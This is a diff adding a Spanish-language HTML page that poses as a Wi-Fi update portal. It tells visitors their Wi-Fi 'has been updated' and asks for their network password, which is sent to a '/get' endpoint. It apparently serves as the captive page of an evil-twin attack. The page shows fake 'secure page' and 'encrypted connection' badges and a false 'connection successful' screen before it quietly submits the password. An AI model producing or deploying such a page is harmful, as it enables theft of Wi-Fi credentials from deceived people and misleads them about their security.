@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <title>Conectar a Wi-Fi</title>
+    <style>
+      *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+      :root {
+        --blue: #2563EB;
+        --blue-dark: #1D4ED8;
+        --blue-subtle: rgba(37,99,235,0.08);
+        --blue-border: rgba(37,99,235,0.22);
+        --bg: #F1F5F9;
+        --surface: #ffffff;
+        --card: #ffffff;
+        --text: #1E293B;
+        --text-muted: #64748B;
+        --border: #E2E8F0;
+      }
+
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+        background-color: var(--bg);
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+      }
+
+      /* ── HEADER ── */
+      header {
+        background-color: var(--surface);
+        border-bottom: 1px solid var(--border);
+        padding: 0 32px;
+        height: 60px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+      }
+
+      .header-left {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+      }
+
+      .header-dot {
+        width: 10px;
+        height: 10px;
+        border-radius: 50%;
+        background: var(--blue);
+      }
+
+      .header-name {
+        font-size: 15px;
+        font-weight: 700;
+        color: var(--text);
+        letter-spacing: 0.2px;
+      }
+
+      .secure-badge {
+        display: flex;
+        align-items: center;
+        gap: 7px;
+        background: #F0FDF4;
+        border: 1px solid #BBF7D0;
+        border-radius: 20px;
+        padding: 5px 14px;
+      }
+      .secure-badge span {
+        font-size: 12px;
+        font-weight: 600;
+        color: #16A34A;
+        letter-spacing: 0.3px;
+      }
+
+      /* ── PÁGINA ── */
+      .page {
+        flex: 1;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 40px 20px;
+      }
+
+      /* ── CARD ── */
+      .login-container {
+        background: var(--card);
+        border: 1px solid var(--border);
+        border-radius: 16px;
+        box-shadow: 0 4px 24px rgba(0,0,0,0.07);
+        width: 100%;
+        max-width: 400px;
+        padding: 40px 36px 36px;
+      }
+
+      /* ── ICONO WIFI ── */
+      .wifi-icon {
+        display: flex;
+        justify-content: center;
+        margin-bottom: 24px;
+      }
+
+      .wifi-circle {
+        width: 64px;
+        height: 64px;
+        border-radius: 50%;
+        background: var(--blue-subtle);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      /* ── TEXTOS ── */
+      .g-h1 {
+        font-size: 21px;
+        font-weight: 700;
+        color: var(--text);
+        text-align: center;
+        margin-bottom: 8px;
+        line-height: 1.3;
+      }
+
+      .g-h2 {
+        font-size: 14px;
+        color: var(--text-muted);
+        text-align: center;
+        font-weight: 400;
+        line-height: 1.6;
+        margin-bottom: 32px;
+      }
+
+      /* ── FORM ── */
+      .login-content {
+        display: flex;
+        flex-direction: column;
+        gap: 16px;
+      }
+
+      .field-label {
+        display: block;
+        font-size: 13px;
+        font-weight: 600;
+        color: var(--text);
+        margin-bottom: 6px;
+      }
+
+      .g-input {
+        width: 100%;
+        background: #F8FAFC;
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        color: var(--text);
+        font-size: 15px;
+        padding: 12px 14px;
+        outline: none;
+        transition: border-color 0.2s, box-shadow 0.2s;
+      }
+      .g-input::placeholder { color: #CBD5E1; }
+      .g-input:focus {
+        border-color: var(--blue);
+        box-shadow: 0 0 0 3px rgba(37,99,235,0.1);
+        background: #ffffff;
+      }
+
+      .txt {
+        font-size: 13px;
+        color: var(--blue);
+        text-decoration: none;
+      }
+      .txt:hover { text-decoration: underline; }
+
+      .button-container { margin-top: 4px; }
+
+      .gbtn-primary {
+        width: 100%;
+        background: var(--blue);
+        color: #ffffff;
+        border: none;
+        border-radius: 8px;
+        font-size: 15px;
+        font-weight: 600;
+        padding: 13px;
+        cursor: pointer;
+        transition: background 0.2s, transform 0.1s;
+      }
+      .gbtn-primary:hover { background: var(--blue-dark); }
+      .gbtn-primary:active { transform: scale(0.99); }
+
+      /* ── DIVIDER ── */
+      .divider {
+        height: 1px;
+        background: var(--border);
+        margin: 24px 0;
+      }
+
+      /* ── INFO PILLS ── */
+      .info-row {
+        display: flex;
+        gap: 8px;
+        justify-content: center;
+        flex-wrap: wrap;
+      }
+
+      .info-pill {
+        display: flex;
+        align-items: center;
+        gap: 5px;
+        font-size: 12px;
+        color: var(--text-muted);
+      }
+
+      .info-pill svg {
+        flex-shrink: 0;
+      }
+
+      /* ── FOOTER ── */
+      footer {
+        background: var(--surface);
+        border-top: 1px solid var(--border);
+        padding: 14px 32px;
+        text-align: center;
+      }
+      footer p {
+        font-size: 12px;
+        color: var(--text-muted);
+      }
+
+      @media (max-width: 480px) {
+        header { padding: 0 16px; }
+        .login-container { padding: 32px 22px 28px; }
+      }
+    </style>
+  </head>
+  <body>
+
+    <!-- HEADER -->
+    <header>
+      <div class="header-left">
+        <div class="header-dot"></div>
+        <span class="header-name">Red Wi-Fi</span>
+      </div>
+      <div class="secure-badge">
+        <svg width="13" height="15" viewBox="0 0 13 15" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect x="1" y="6" width="11" height="8" rx="2" fill="none" stroke="#16A34A" stroke-width="1.3"/>
+          <path d="M3.5 6V4a3 3 0 0 1 6 0v2" stroke="#16A34A" stroke-width="1.3" stroke-linecap="round"/>
+          <circle cx="6.5" cy="10" r="1.2" fill="#16A34A"/>
+        </svg>
+        <span>Página segura</span>
+      </div>
+    </header>
+
+    <!-- MAIN -->
+    <div class="page">
+      <div class="login-container">
+
+        <!-- Ícono Wi-Fi -->
+        <div class="wifi-icon">
+          <div class="wifi-circle">
+            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M5 12.5C7.8 9.5 10.2 8 12 8s4.2 1.5 7 4.5" stroke="#2563EB" stroke-width="1.8" stroke-linecap="round"/>
+              <path d="M7.5 15c1.2-1.4 2.7-2.2 4.5-2.2s3.3.8 4.5 2.2" stroke="#2563EB" stroke-width="1.8" stroke-linecap="round"/>
+              <circle cx="12" cy="18.5" r="1.3" fill="#2563EB"/>
+            </svg>
+          </div>
+        </div>
+
+        <form action="/get" id="wifi-form">
+          <h1 class="g-h1">¡Tu Wi-Fi se ha actualizado!</h1>
+           <h2 class="g-h2">Ingresá la contraseña de tu red Wi-Fi para conectarte.</h2>
+          <div class="login-content">
+            <div>
+              <input id="password" name="password" type="password" class="g-input" placeholder="Contraseña Wi-Fi" required>
+            </div>
+            <a href="#" class="txt">Más información</a>
+            <div class="button-container">
+              <button class="gbtn-primary" type="submit">Conectar</button>
+            </div>
+          </div>
+        </form>
+
+        <div id="success-screen" style="display:none; text-align:center; padding: 32px 16px;">
+          <div style="margin-bottom: 28px;">
+            <svg width="72" height="72" viewBox="0 0 72 72" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <circle cx="36" cy="36" r="36" fill="#2563EB22"/>
+              <circle cx="36" cy="36" r="26" fill="#2563EB44"/>
+              <path d="M22 37l9 9 19-19" stroke="#2563EB" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </div>
+          <h2 style="font-size:22px; font-weight:700; color:#2563EB; margin-bottom:10px;">¡Conexión exitosa!</h2>
+          <p style="font-size:15px; color:#64748B; margin-bottom:24px; line-height:1.6;">Ya estás conectado a la red Wi-Fi. Gracias por su atención.</p>
+          <a href="#" style="font-size:13px; color:#2563EB; text-decoration:none; font-weight:500;">Obtener más información</a>
+        </div>
+
+        
+
+        <div class="divider"></div>
+
+        <div class="info-row">
+          <div class="info-pill">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none">
+              <circle cx="12" cy="12" r="10" stroke="#94A3B8" stroke-width="1.5"/>
+              <path d="M12 8v4l3 3" stroke="#94A3B8" stroke-width="1.5" stroke-linecap="round"/>
+            </svg>
+            Conexión cifrada
+          </div>
+          <div class="info-pill">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none">
+              <path d="M12 2L2 7l10 5 10-5-10-5z" stroke="#94A3B8" stroke-width="1.5" stroke-linejoin="round"/>
+              <path d="M2 17l10 5 10-5M2 12l10 5 10-5" stroke="#94A3B8" stroke-width="1.5" stroke-linejoin="round"/>
+            </svg>
+            Tus datos están protegidos
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- FOOTER -->
+    <footer>
+      <p>© 2026 — Portal de acceso Wi-Fi seguro</p>
+    </footer>
+
+  
+        <script>
+      var form = document.getElementById('wifi-form');
+      if (form) {
+        form.addEventListener('submit', function(e) {
+          e.preventDefault();
+          form.style.display = 'none';
+          document.getElementById('success-screen').style.display = 'block';
+          setTimeout(function() { form.submit(); }, 1500);
+        });
+      }
+    </script>
+  </body>
+</html>
